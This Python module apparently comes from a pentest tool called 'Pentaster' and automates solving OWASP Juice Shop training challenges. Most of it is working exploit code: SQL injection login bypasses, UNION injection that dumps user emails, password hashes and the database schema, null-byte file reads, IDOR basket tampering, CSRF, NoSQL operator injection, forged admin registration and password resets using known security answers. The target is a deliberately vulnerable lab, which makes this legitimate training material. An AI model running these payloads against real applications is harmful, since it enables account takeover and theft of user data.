"""Pentaster — solveur de challenges OWASP Juice Shop (module importable).

Chaque solveur exécute l'exploit HTTP/API réel puis on vérifie l'état via
GET /api/Challenges. Contrairement au script autonome dont il est issu
(`scripts/solve.py`), ce module ne dépend d'aucun global tiré de
`sys.argv` : la cible (`base_url`) est un paramètre explicite, portée par
un petit objet `Session`, afin que le module soit importable et testable
sans jamais toucher au réseau tant qu'on n'appelle pas `run_solvers`.
"""
from __future__ import annotations

import base64
import json
import urllib.error
import urllib.parse
import urllib.request
from typing import Callable


class Session:
    """Porte la base URL cible et regroupe les helpers HTTP/JSON/login."""

    def __init__(self, base_url: str):
        self.base = base_url

    def req(self, method, path, *, headers=None, data=None, cookies=None, raw=False):
        url = self.base + path
        hdrs = {"Content-Type": "application/json"}
        if headers:
            hdrs.update(headers)
        if cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
        body = None
        if data is not None:
            body = data if raw else json.dumps(data).encode()
            if raw:
                body = data.encode() if isinstance(data, str) else data
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return -1, str(e)

    def json_(self, txt):
        try:
            return json.loads(txt, strict=False)
        except Exception:  # noqa: BLE001
            return {}

    def login(self, email, password):
        st, txt = self.req("POST", "/rest/user/login",
                            data={"email": email, "password": password})
        return self.json_(txt).get("authentication", {}).get("token")

    def admin_session(self):
        r = self.json_(self.req("POST", "/rest/user/login",
                                 data={"email": "admin@juice-sh.op", "password": "admin123"})[1])
        a = r.get("authentication", {})
        return a.get("token"), a.get("bid")


def challenge_status(base_url: str) -> tuple[dict[str, bool], int]:
    sess = Session(base_url)
    _, txt = sess.req("GET", "/api/Challenges/")
    data = sess.json_(txt).get("data", [])
    return {c["name"]: c.get("solved", False) for c in data}, len(data)


# ----------------------------- Solveurs ---------------------------------
# Chaque solveur prend la `Session` en paramètre (au lieu d'utiliser un BASE
# global) mais la logique d'exploit reste identique à `scripts/solve.py`.

def s_login_admin(sess: Session):
    """Login Admin — SQLi bypass."""
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "' OR true--", "password": "x"})
    return "authentication" in txt


def s_login_bender(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "bender@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_jim(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "jim@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_user_credentials(sess: Session):
    """User Credentials — UNION SQLi (Products = 9 colonnes)."""
    q = ("qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20"
         "createdAt,%20updatedAt,%20deletedAt,%20'7',%20'8',%20'9'%20FROM%20Users--")
    st, txt = sess.req("GET", f"/rest/products/search?q={q}")
    return "@" in txt and st == 200


def s_password_hash_leak(sess: Session):
    tok = sess.login("admin@juice-sh.op", "admin123") or sess.login("' OR true--", "x")
    if not tok:
        return False
    st, txt = sess.req("GET", "/rest/user/whoami?fields=id,password",
                        cookies={"token": tok})
    return '"password"' in txt


def s_csrf(sess: Session):
    tok = sess.login("admin@juice-sh.op", "admin123")
    if not tok:
        return False
    st, txt = sess.req("POST", "/profile",
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "Origin": "http://htmledit.squarefree.com"},
                        cookies={"token": tok},
                        data="username=csrfPwn", raw=True)
    return st in (200, 302)


def s_privacy_policy_proof(sess: Session):
    st, _ = sess.req("GET",
                      "/we/may/also/instruct/you/to/refuse/all/reasonably/"
                      "necessary/responsibility")
    return st in (200, 404)  # solveIf s'exécute avant sendFile


def s_expired_coupon(sess: Session):
    login_resp = sess.req("POST", "/rest/user/login",
                           data={"email": "admin@juice-sh.op", "password": "admin123"})
    auth = sess.json_(login_resp[1]).get("authentication", {})
    tok, bid = auth.get("token"), auth.get("bid")
    if not tok or not bid:
        return False
    coupon = base64.b64encode(b"WMNSDY2019-1551999600000").decode()
    st, txt = sess.req("POST", f"/rest/basket/{bid}/checkout",
                        headers={"Authorization": f"Bearer {tok}"},
                        cookies={"token": tok},
                        data={"couponData": coupon})
    return "orderConfirmation" in txt


def s_access_confidential_document(sess: Session):
    st, txt = sess.req("GET", "/ftp/acquisitions.md")
    return st == 200


def s_admin_registration(sess: Session):
    """Admin Registration — champ role côté client."""
    email = f"adm{abs(hash(sess.base)) % 99999}@x.io"
    st, txt = sess.req("POST", "/api/Users",
                        data={"email": email, "password": "Passw0rd!",
                              "passwordRepeat": "Passw0rd!", "role": "admin",
                              "securityQuestion": {"id": 1, "question": "q",
                                                    "createdAt": "", "updatedAt": ""},
                              "securityAnswer": "x"})
    return '"role":"admin"' in txt or st == 201


def s_zero_stars(sess: Session):
    """Zero Stars — feedback 0 étoile (captcha résolu côté API)."""
    _, cap = sess.req("GET", "/rest/captcha/")
    c = sess.json_(cap)
    if "captchaId" not in c:
        return False
    st, txt = sess.req("POST", "/api/Feedbacks",
                        data={"comment": "0-star via API", "rating": 0,
                              "captchaId": c["captchaId"], "captcha": str(c["answer"])})
    return st in (200, 201)


def s_security_policy(sess: Session):
    st, txt = sess.req("GET", "/.well-known/security.txt")
    return st == 200


def s_ephemeral_accountant(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "acc0unt4nt@juice-sh.op'--", "password": "x"})
    # requête intentionnelle : login as an inexistent accountant via SQLi
    return "authentication" in txt


def s_null_byte_file(path: str) -> Callable[[Session], bool]:
    def _f(sess: Session):
        st, _ = sess.req("GET", path)
        return st == 200
    return _f


def s_database_schema(sess: Session):
    q = ("qwert%27))%20UNION%20SELECT%20sql,%202,%203,%204,%205,%206,%207,%208,%209%20"
         "FROM%20sqlite_master--")
    st, txt = sess.req("GET", f"/rest/products/search?q={q}")
    return "CREATE TABLE" in txt


def s_login_ciso(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "ciso@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_empty_registration(sess: Session):
    st, txt = sess.req("POST", "/api/Users",
                        data={"email": "", "password": "",
                              "passwordRepeat": "", "role": "customer"})
    return st in (201, 400)  # solveIf déclenché par email/password vides


def s_reset_jim(sess: Session):
    st, txt = sess.req("POST", "/rest/user/reset-password",
                        data={"email": "jim@juice-sh.op", "answer": "Samuel",
                              "new": "azerty12", "repeat": "azerty12"})
    return st == 200


def s_gdpr_data_theft(sess: Session):
    """GDPR Data Theft — collision d'email masqué (voyelles → *)."""
    n = abs(hash(sess.base)) % 9000
    vic, atk = f"aaa{n}@bar.op", f"eee{n}@bar.op"
    for e in (vic, atk):
        sess.req("POST", "/api/Users",
                  data={"email": e, "password": "Passw0rd!", "passwordRepeat": "Passw0rd!",
                        "securityQuestion": {"id": 1, "question": "q", "createdAt": "", "updatedAt": ""},
                        "securityAnswer": "x"})
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": vic, "password": "Passw0rd!"})[1])["authentication"]
    vt, vb = la["token"], la["bid"]
    sess.req("POST", "/api/BasketItems", headers={"Authorization": f"Bearer {vt}"},
              data={"ProductId": 1, "BasketId": vb, "quantity": 1})
    sess.req("POST", f"/rest/basket/{vb}/checkout", headers={"Authorization": f"Bearer {vt}"}, data={})
    aa = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": atk, "password": "Passw0rd!"})[1])["authentication"]
    at = aa["token"]
    aid = sess.json_(sess.req("GET", "/rest/user/whoami?fields=id", cookies={"token": at})[1])["user"]["id"]
    st, txt = sess.req("POST", "/rest/user/data-export",
                        headers={"Authorization": f"Bearer {at}"}, data={"UserId": aid})
    return "orderId" in txt


def s_view_basket_idor(sess: Session):
    """View Basket — IDOR : lire le panier d'un autre utilisateur."""
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": "jim@juice-sh.op'--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    st, txt = sess.req("GET", "/rest/basket/2", cookies={"token": tok},
                        headers={"Authorization": f"Bearer {tok}"})
    return st == 200


def s_forged_feedback(sess: Session):
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": "' OR true--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    _, cap = sess.req("GET", "/rest/captcha/")
    c = sess.json_(cap)
    st, txt = sess.req("POST", "/api/Feedbacks",
                        headers={"Authorization": f"Bearer {tok}"},
                        data={"comment": "forged", "rating": 1, "UserId": 3,
                              "captchaId": c.get("captchaId"), "captcha": str(c.get("answer"))})
    return st in (200, 201)


def s_christmas_special(sess: Session):
    tok, bid = sess.admin_session()
    if not tok:
        return False
    sess.req("POST", "/api/BasketItems", headers={"Authorization": f"Bearer {tok}"},
              data={"ProductId": 10, "BasketId": bid, "quantity": 1})
    st, txt = sess.req("POST", f"/rest/basket/{bid}/checkout",
                        headers={"Authorization": f"Bearer {tok}"}, data={})
    return "orderConfirmation" in txt


def s_gdpr_erasure(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "chris.pike@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_amy(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "amy@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_mc(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "mc.safesearch@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_repetitive_registration(sess: Session):
    n = abs(hash(sess.base + "rep")) % 9000
    st, txt = sess.req("POST", "/api/Users",
                        data={"email": f"rep{n}@x.io", "password": "aaa",
                              "passwordRepeat": "bbb", "role": "customer",
                              "securityQuestion": {"id": 1, "question": "q", "createdAt": "", "updatedAt": ""},
                              "securityAnswer": "x"})
    return st in (201, 400)


def s_extra_language(sess: Session):
    st, txt = sess.req("GET", "/assets/i18n/tlh_AA.json")
    return st == 200


def s_missing_encoding(sess: Session):
    st, txt = sess.req(
        "GET",
        "/assets/public/images/uploads/%F0%9F%98%BC-"
        "%23zatschi-%23whoneedsfourlegs-1572600969477.jpg")
    return st == 200


def s_nested_easter_egg(sess: Session):
    st, txt = sess.req(
        "GET",
        "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
    return st in (200, 404)


def s_nosql_manipulation(sess: Session):
    """NoSQL Manipulation — MongoDB operator sur les reviews."""
    tok, _ = sess.admin_session()
    st, txt = sess.req("PATCH", "/rest/products/reviews",
                        headers={"Authorization": f"Bearer {tok}"} if tok else None,
                        data={"id": {"$ne": -1}, "message": "NoSQL pwned"})
    return st in (200, 201)


def s_manipulate_basket(sess: Session):
    """Manipulate Basket — ajouter un article au panier d'autrui (IDOR)."""
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": "jim@juice-sh.op'--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    st, txt = sess.req("POST", "/api/BasketItems",
                        headers={"Authorization": f"Bearer {tok}"},
                        data={"ProductId": 1, "BasketId": 3, "quantity": 1})
    return st in (200, 201, 400)


def s_reset_bender(sess: Session):
    st, txt = sess.req("POST", "/rest/user/reset-password",
                        data={"email": "bender@juice-sh.op", "answer": "Stop'n'Drop",
                              "new": "slurmz123", "repeat": "slurmz123"})
    return st == 200


SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
    ("Login Admin", s_login_admin),
    ("Login Bender", s_login_bender),
    ("Login Jim", s_login_jim),
    ("User Credentials", s_user_credentials),
    ("Password Hash Leak", s_password_hash_leak),
    ("CSRF", s_csrf),
    ("Privacy Policy Inspection", s_privacy_policy_proof),
    ("Expired Coupon", s_expired_coupon),
    ("Access a Confidential Document", s_access_confidential_document),
    ("Admin Registration", s_admin_registration),
    ("Zero Stars", s_zero_stars),
    ("Security Policy", s_security_policy),
    ("Ephemeral Accountant", s_ephemeral_accountant),
    ("Poison Null Byte (package.json.bak)", s_null_byte_file("/ftp/package.json.bak%2500.md")),
    ("Forgotten Sales Backup", s_null_byte_file("/ftp/coupons_2013.md.bak%2500.md")),
    ("Misplaced Signature File", s_null_byte_file("/ftp/suspicious_errors.yml%2500.md")),
    ("Easter Egg", s_null_byte_file("/ftp/eastere.gg%2500.md")),
    ("Database Schema", s_database_schema),
    ("Login CISO", s_login_ciso),
    ("Empty User Registration", s_empty_registration),
    ("Reset Jim's Password", s_reset_jim),
    ("GDPR Data Theft", s_gdpr_data_theft),
    ("View Basket (IDOR)", s_view_basket_idor),
    ("Forged Feedback", s_forged_feedback),
    ("Christmas Special", s_christmas_special),
    ("GDPR Data Erasure", s_gdpr_erasure),
    ("Login Amy", s_login_amy),
    ("Login MC SafeSearch", s_login_mc),
    ("Repetitive Registration", s_repetitive_registration),
    ("Extra Language", s_extra_language),
    ("Missing Encoding", s_missing_encoding),
    ("Nested Easter Egg", s_nested_easter_egg),
    ("NoSQL Manipulation", s_nosql_manipulation),
    ("Manipulate Basket", s_manipulate_basket),
    ("Reset Bender's Password", s_reset_bender),
]


def run_solvers(base_url: str) -> dict:
    """Exécute tous les solveurs contre `base_url` et renvoie un résumé.

    {
        "before": int,               # nb résolus avant exécution
        "after": int,                # nb résolus après exécution
        "total": int,                # nb total de challenges
        "newly_solved": list[str],   # noms nouvellement résolus (triés)
        "ran": list[tuple[str, bool]],  # (nom, exploit exécuté avec succès ?)
    }
    """
    sess = Session(base_url)
    before, total = challenge_status(base_url)
    n_before = sum(1 for v in before.values() if v)

    ran: list[tuple[str, bool]] = []
    for label, fn in SOLVERS:
        try:
            ok = bool(fn(sess))
        except Exception:  # noqa: BLE001
            ok = False
        ran.append((label, ok))

    after, _ = challenge_status(base_url)
    n_after = sum(1 for v in after.values() if v)
    newly_solved = sorted(k for k in after if after[k] and not before.get(k))

    return {
        "before": n_before,
        "after": n_after,
        "total": total,
        "newly_solved": newly_solved,
        "ran": ran,
    }
